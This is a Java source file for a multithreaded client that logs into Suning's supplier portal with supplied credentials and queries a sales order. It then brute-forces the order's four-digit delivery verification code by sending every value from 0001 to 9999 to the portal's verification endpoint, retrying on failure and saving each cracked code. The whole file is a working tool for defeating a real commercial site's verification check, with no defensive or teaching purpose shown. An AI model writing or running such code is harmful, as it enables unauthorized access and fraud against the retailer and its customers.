package wilson.verifyCode;

import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.Date;
import java.util.List;

import org.apache.http.cookie.Cookie;
import org.apache.http.impl.client.BasicCookieStore;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;

public class MainClient extends Thread{
	private static List<Cookie> loginCookies;
	private static BasicCookieStore cookieStore = new BasicCookieStore();
	private static CloseableHttpClient httpclient = HttpClients.custom()
    .setDefaultCookieStore(cookieStore)
    .build();
	private VerifyCode vc = new VerifyCode();
	private SelectDeliverInform sdi = new SelectDeliverInform();
	private Login lg = new Login();
	private VerifyCodeManager vcm = new VerifyCodeManager();
	private int codeInt = 1;
	private String userName = "";
	private String password = "";
	private String saleOrderNo = "";
		
	public void run(){
		try {
			startThis(this.getUserName(), this.getPassword(), this.getSaleOrderNo());
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

    public String startThis(String userName,String password,String saleOrderNo) throws Exception {
    	
    	System.out.println("尝试中，用户名 = " + userName + "  销售单号 = " + saleOrderNo );
    	
    	if(!login(userName, password)){
    		System.out.println("用户名 = " + userName + "  销售单号 = " + saleOrderNo  + "   失败 ，验证码测试到" + this.getCodeInt());
    		return "登录失败";
    	} 
    	
    	if(!select(saleOrderNo)){
    		System.out.println("用户名 = " + userName + "  销售单号 = " + saleOrderNo  + "   失败 ，验证码测试到" + this.getCodeInt());
    		return "查询失败";
    	} 
    	
    	if(!tryCode(sdi.getHidreturnnoticedetailid(),saleOrderNo)){
    		System.out.println("用户名 = " + userName + "  销售单号 = " + saleOrderNo  + "   失败 ，验证码测试到" + this.getCodeInt());
    		Thread.currentThread();
			Thread.sleep(10000);
    		System.out.println("用户名 = " + userName + "  销售单号 = " + saleOrderNo  + "   重试中");
    		if(login(userName, password) && select(saleOrderNo) && tryCode(sdi.getHidreturnnoticedetailid(),saleOrderNo)){
    			//continue;
    		}else{
    			return "破解失败";
    		}
    	} 
    	
    	//关闭client
    	closeClient();
    	
    	System.out.println("用户名 = " + userName + "  销售单号 = " + saleOrderNo  + "   成功  ，验证码是  " + this.getCodeInt());
    	//成功后做记录
    	if(vcm.saveVerifyCode(saleOrderNo,this.getCodeInt(),this.getSdi().getSearchResult())){
    		System.out.println("销售订单号=" + saleOrderNo + "验证码=" + this.getCodeInt() + " 保存成功");
    	}else{
    		System.out.println("销售订单号=" + saleOrderNo + "验证码=" + this.getCodeInt() + " 保存失败");
    	}
    	return "成功";
    }
    
    
    private boolean closeClient(){
    	try {
			MainClient.getHttpclient().close();	
			return true;
		} catch (IOException e) {
			e.printStackTrace();
		}
    	return false;
    }
    
    private boolean tryCode(String hidReturnNoticeDetailId,String saleOrderNo) {
    	//尝试验证
    	try{
    		System.out.println("开始验证时间 =" + new Date());
        	int verifycodeResult = verifycode(1,hidReturnNoticeDetailId,saleOrderNo);

    		if(verifycodeResult == 0){
        		System.out.println("验证完成，销售单号 = " + saleOrderNo + " verifycodeResult = " + verifycodeResult);
        	}else if(verifycodeResult == 1){
        		System.out.println("验证停止，销售单号 = " + saleOrderNo + " verifycodeResult = " + verifycodeResult);
        		return false;
        	}else{
        		System.out.println("验证停止，销售单号 = " + saleOrderNo + " verifycodeResult = " + verifycodeResult);
        		return false;
        	}
        	
        	System.out.println("完成验证时间 = " + new Date());
        	return true;
    	}catch(Exception e){
    		e.printStackTrace();
    	}
    	return false;
    }
    
    public boolean login(String userName,String password) throws URISyntaxException{
    	//登录
    	if(true == lg.login(new URI("http://scs.suning.com/sps/portal/showLoginPage.action"),userName,password)){
    		System.out.println("登录成功");   		
//    		if (null != loginCookies) {
//    			System.out.println("登录cookies");
//                for (int i = 0; i < loginCookies.size(); i++) {
//                    System.out.println("- " + loginCookies.get(i).toString());
//                }
//            }
    		return true;
    	}else{
    		System.out.println("登录失败");
    		return false;
    	}
    }
    
    public boolean select(String saleOrderNo) throws URISyntaxException{
    	//查询
    	if(true == sdi.selectDeliverInform(new URI("http://scs.suning.com/te/deliveryinformdetailcontroller/selectDeliveryInform.action"),saleOrderNo)){
    		System.out.println("查询成功");
    		return true;
    	}else{
    		System.out.println("查询失败");
    		return false;
    	}
    	
    }
    
    //尝试验证码
    private int verifycode(int startCode,String hidReturnNoticeDetailId,String saleOrderNo) throws URISyntaxException {
    	int resultcode = -1;
    	int i = 0;
    	codeInt = startCode;
    	String codeStr = String.valueOf(codeInt);
    	while(codeStr.length() < 4){
    		codeStr = "0" + codeStr;
    	}
    	while(codeInt < 10000){
    		resultcode = vc.VerifyCode(new URI("http://scs.suning.com/te/deliveryinformdetailcontroller/verifyCode.action"), codeStr ,hidReturnNoticeDetailId);
    		if(resultcode == 1){   	
    			codeInt ++;
    			if(0 == (i % 100)){
    				System.out.println("saleOrderNo : " + saleOrderNo + " code : " + codeInt + " " + resultcode + "  ");
    			}
    			i ++ ;
        		codeStr = String.valueOf(codeInt);
            	while(codeStr.length() < 4){
            		codeStr = "0" + codeStr;
            	}
    		}else{
            	System.out.println("saleOrderNo = " + saleOrderNo + " other result, result = " + resultcode);
    			break;
    		}
    	}
		return resultcode;
    }

	public static List<Cookie> getLoginCookies() {
		return loginCookies;
	}

	public static void setLoginCookies(List<Cookie> loginCookies) {
		MainClient.loginCookies = loginCookies;
	}

	public static CloseableHttpClient getHttpclient() {
		return httpclient;
	}

	public static void setHttpclient(CloseableHttpClient httpclient) {
		MainClient.httpclient = httpclient;
	}

	public static BasicCookieStore getCookieStore() {
		return cookieStore;
	}

	public static void setCookieStore(BasicCookieStore cookieStore) {
		MainClient.cookieStore = cookieStore;
	}

	public  VerifyCode getVc() {
		return this.vc;
	}

	public  void setVc(VerifyCode vc) {
		this.vc = vc;
	}

	public  SelectDeliverInform getSdi() {
		return this.sdi;
	}

	public  void setSdi(SelectDeliverInform sdi) {
		this.sdi = sdi;
	}

	public Login getLg() {
		return this.lg;
	}

	public  void setLg(Login lg) {
		this.lg = lg;
	}

	public int getCodeInt() {
		return codeInt;
	}

	public void setCodeInt(int codeInt) {
		this.codeInt = codeInt;
	}


	public String getUserName() {
		return userName;
	}


	public void setUserName(String userName) {
		this.userName = userName;
	}


	public String getPassword() {
		return password;
	}


	public void setPassword(String password) {
		this.password = password;
	}


	public String getSaleOrderNo() {
		return saleOrderNo;
	}


	public void setSaleOrderNo(String saleOrderNo) {
		this.saleOrderNo = saleOrderNo;
	}

	public VerifyCodeManager getVcm() {
		return vcm;
	}

	public void setVcm(VerifyCodeManager vcm) {
		this.vcm = vcm;
	}
}
